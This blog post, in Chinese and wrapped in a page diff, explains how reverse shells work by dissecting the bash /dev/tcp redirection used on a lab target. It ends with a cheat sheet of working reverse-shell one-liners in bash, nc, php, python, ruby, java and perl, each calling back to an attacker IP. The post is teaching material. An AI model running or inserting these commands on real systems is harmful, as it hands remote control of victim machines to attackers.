@@ -1,0 +1,158 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>反弹shell原理 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicn.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">反弹shell原理</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2020-01-31</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="shell"> shell</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
+<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+<p>2.它的ip会动态改变，你不能持续控制。</p>
+<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
+<p>反弹即是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接</p>
+<h2 id="反弹shell的本质"><a href="#反弹shell的本质" class="headerlink" title="反弹shell的本质"></a>反弹shell的本质</h2><p>在靶机上执行如下命令<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span>/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2020/02/05/Zt4rY3hGBnNi5A8.jpg" alt=""></p>
+<p>在攻击机上接收到会话<br><img src="https://i.loli.net/2020/02/05/Cbdw9KkpUqEugZf.jpg" alt=""></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>对上述命令进行拆分</p>
+<ul>
+<li><code>bash -i</code></li>
+</ul>
+<ol>
+<li><strong>-i</strong> 这一命令表示shell是交互式的，你输入一行命令，shell就执行一行命令</li>
+<li>其实不止可以使用bash，因为linux有多个shell，所以也可以使用sh、zsh等</li>
+</ol>
+<ul>
+<li><p><code>&gt;&amp;</code><br>根据shell手册上的解释，这种结构把标准输出 和标准错误输出同时重定向其后的文件中，一般有两种形式：<code>&gt;&amp;[word]</code>和<code>&amp;&gt;[word]</code></p>
+</li>
+<li><p><code>/dev/tcp/IP/PORT</code><br>如果主机名是个有效的主机名称或因特网地址，并且端口号是整数型的端口 号或服务名称，bash 会试图打开一个到相应套接字端口的 tcp 连接<br><code>/dev/tcp|udp/ip/port</code> 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的</p>
+</li>
+</ul>
+<h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>1.输入<code>bash -i &gt; /dev/tcp/ip/port</code><br>会发现在靶机上输入命令，其结果会在攻击机上显示<br><img src="https://i.loli.net/2020/02/05/glufKzZLn46oiGN.jpg" alt=""></p>
+<p><img src="https://i.loli.net/2020/02/05/bcoUDwM5O1T9JXm.jpg" alt=""></p>
+<p>上述命令的含义就是将靶机上的输出重定向到攻击机上</p>
+<p>2.输入<code>bash -i &lt; /dev/tcp/ip/port</code><br>则意味着将输入重定向，也就是攻击机上的输入结果会回显到靶机上<br><img src="https://i.loli.net/2020/02/05/nxQo8KShXBrb4eZ.jpg" alt=""></p>
+<p><img src="https://i.loli.net/2020/02/05/Eedf2r48uABgDV7.jpg" alt=""></p>
+<p>3.将上述俩条命令结合就形成了<code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</code></p>
+<p>满足了在攻击机上输入命令，攻击机上回显，但是，靶机上同样会显示攻击机所输入的命令</p>
+<p><img src="https://i.loli.net/2020/02/05/Xawm7AykTd8uO2P.jpg" alt=""></p>
+<p><img src="https://i.loli.net/2020/02/05/DzCu1Ev7xgYyRLm.jpg" alt=""></p>
+<p>4.对比最开始的命令<code>bash -i &gt;&amp; /dev/tcp/192.168.43.164/6666 0&gt;&amp;1</code>，3的区别就在于缺少标准错误的重定向，实际上就是后面少了一个<code>2&gt;&amp;1</code></p>
+<p>标准错误2不仅显示错误信息，居然还有回显输入命令和终端提示符的作用。</p>
+<p><img src="https://i.loli.net/2020/02/05/v5Fxi1pPTEXnoM6.jpg" alt=""></p>
+<p><img src="https://i.loli.net/2020/02/05/JO1uznQAstYyPMa.jpg" alt=""></p>
+<h3 id="进一步"><a href="#进一步" class="headerlink" title="进一步"></a>进一步</h3><p>对于<code>bash -i &gt;&amp; /dev/tcp/192.168.43.164/6666 0&gt;&amp;1</code>，等价于<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/<span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span>/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">bash -i&gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span>/<span class="number">6666</span> <span class="number">0</span>&lt;&amp;<span class="number">1</span></span><br><span class="line">bash -i&gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span>/<span class="number">6666</span> &lt;&amp;<span class="number">1</span></span><br><span class="line">bash -i&gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span>/<span class="number">6666</span> &lt;&amp;<span class="number">2</span></span><br><span class="line">bash -i <span class="number">1</span>&gt;/dev/tcp/<span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span>/<span class="number">6666</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><h3 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span><span class="number">.190</span><span class="number">.138</span>/<span class="number">6666</span>;cat &lt;&amp;<span class="number">5</span>|while read line;do $line&gt;&amp;<span class="number">5</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>;done</span><br></pre></td></tr></table></figure>
+<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.190.138/6666</code> 并且方式是读写方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> | <span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    …</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>这是一种常见的用法，command命令的输出作为read循环的输入，while read line 是一次性将文件信息读入并赋值给变量line ，while中使用重定向机制,文件中的所有信息都被读入并重定向给了整个while 语句中的line 变量。</p>
+<p>上述命令使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能</p>
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>nc很少出现在生产系统中，即使存在，有些也没有<code>-e</code>选项<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure></p>
+<p>出于上述原因，还有另一种方法<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm <span class="meta-keyword">/tmp/</span>f;mkfifo <span class="meta-keyword">/tmp/</span>f;cat <span class="meta-keyword">/tmp/</span>f|<span class="meta-keyword">/bin/</span>sh -i <span class="number">2</span>&gt;<span class="variable">&amp;1</span>|nc <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span> &gt;<span class="meta-keyword">/tmp/</span>f</span><br></pre></td></tr></table></figure></p>
+<p>在tmp目录下创立一个名称为f的管道</p>
+<blockquote>
+<p>管道是一种通信机制，通常用于进程间的通信（也可通过socket进行网络通信），它表现出来的形式将前面每一个进程的输出（stdout）直接作为下一个进程的输入（stdin）</p>
+</blockquote>
+<p>cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>方法1：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/<span class="number">7777</span>")'</span><br></pre></td></tr></table></figure></p>
+<p>方法2：<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen(<span class="string">"10.0.0.1"</span>,<span class="number">1234</span>);<span class="built_in">exec</span>(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'</span><br></pre></td></tr></table></figure></p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"10.0.0.1"</span>,<span class="number">1234</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);'</span><br></pre></td></tr></table></figure>
+<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e'f=TCPSocket.<span class="keyword">open</span>(<span class="string">"10.0.0.1"</span>,<span class="number">1234</span>).to_i;<span class="built_in">exec</span> sprintf(<span class="string">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span>,f,f,f)'</span><br></pre></td></tr></table></figure>
+<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -<span class="keyword">e</span> '<span class="keyword">use</span> Socket;<span class="variable">$i</span>=<span class="string">"10.0.0.1"</span>;<span class="variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">"tcp"</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);exec(<span class="string">"/bin/sh -i"</span>);&#125;;'</span><br></pre></td></tr></table></figure>
+<p>参考链接：<br><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a><br><a href="https://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153986.html</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2020/01/31/OS/反弹shell原理/">http://microvorld.com/2020/01/31/OS/反弹shell原理/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2020/01/30/靶机/DC-3/" title="DC-3"><span>NextPost ></span><br><span class="nextTitle">DC-3</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是反弹shell"><span class="toc-number">1.</span> <span class="toc-text">什么是反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么要反弹shell"><span class="toc-number">2.</span> <span class="toc-text">为什么要反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell的本质"><span class="toc-number">3.</span> <span class="toc-text">反弹shell的本质</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#探索"><span class="toc-number">3.2.</span> <span class="toc-text">探索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进一步"><span class="toc-number">3.3.</span> <span class="toc-text">进一步</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他方法"><span class="toc-number">4.</span> <span class="toc-text">其他方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec函数"><span class="toc-number">4.1.</span> <span class="toc-text">exec函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc"><span class="toc-number">4.2.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">4.3.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python"><span class="toc-number">4.4.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ruby"><span class="toc-number">4.5.</span> <span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java"><span class="toc-number">4.6.</span> <span class="toc-text">java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perl"><span class="toc-number">4.7.</span> <span class="toc-text">perl</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
